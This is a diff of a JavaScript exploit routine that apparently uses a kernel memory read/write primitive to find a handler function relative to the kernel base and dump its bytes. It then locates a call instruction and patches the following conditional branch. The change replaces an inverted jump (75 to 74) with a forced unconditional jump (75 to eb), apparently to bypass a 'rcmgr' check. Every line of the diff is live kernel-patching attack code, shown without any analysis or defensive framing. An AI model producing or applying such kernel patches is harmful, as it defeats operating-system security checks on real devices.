@@ -1453,7 +1453,7 @@ async function attempt(ctx, opts) {
     var fnRva = (fn.low - kbase.low) >>> 0;
     if (fnRva >= TEXT_SIZE) return;
 
-    var body = k.read(fn, 0x200);
+    var body = k.read(fn, 0x400);
     if (!body) return;
 
     var hx = function (arr, from, to) {
@@ -1462,7 +1462,9 @@ async function attempt(ctx, opts) {
       return s.trim();
     };
 
-    say("[dbg] handler rva 0x" + fnRva.toString(16) + " first 32: " + hx(body, 0, 32));
+    for (var o = 0; o < 0x400; o += 0x40) {
+      say("[dbg] +" + o.toString(16).padStart(3, "0") + ": " + hx(body, o, o + 0x40));
+    }
 
     var callOff = -1;
     for (var i = 0; i < body.length - 5; i++) {
@@ -1485,9 +1487,9 @@ async function attempt(ctx, opts) {
     say("[dbg] after : " + hx(body, callOff + 5, hi));
 
     var jnzRva = fnRva + callOff + 7;
-    var plist = [[jnzRva, "74", "rcmgr-jz"]];
+    var plist = [[jnzRva, "eb", "rcmgr-jnz"]];
     k.apply(kbase, plist);
-    say("[dbg] inverted branch at rva 0x" + jnzRva.toString(16) + " (75 -> 74) -- go to Settings");
+    say("[dbg] forced branch at rva 0x" + jnzRva.toString(16) + " (75 -> eb) -- go to Settings");
 
     var chk = k.read(plus(kbase, jnzRva), 1);
     say("[dbg] byte now: " + (chk ? chk[0].toString(16) : "unreadable"));
